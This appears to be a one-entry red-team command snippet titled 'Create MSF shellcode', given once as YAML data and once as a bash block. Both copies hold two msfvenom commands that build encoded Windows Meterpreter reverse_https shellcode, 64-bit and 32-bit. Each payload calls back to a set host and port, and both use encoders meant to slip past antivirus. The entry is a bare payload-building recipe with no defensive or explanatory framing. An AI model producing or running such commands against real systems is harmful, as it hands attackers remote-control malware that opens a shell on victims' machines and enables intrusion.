---
id: 894c2a1d-224c-4f2f-a93f-94e2fb132169
name: Create MSF shellcode
type: command
executor: bash
data: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443
  -b ''\x00''  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f
  raw -o msf64.bin

  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b ''\x00''
  -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin'
output: null
created_at: '2023-04-06T03:56:23.232682+00:00'
updated_at: '2023-04-10T20:36:50.027825+00:00'
---

# Create MSF shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin
```
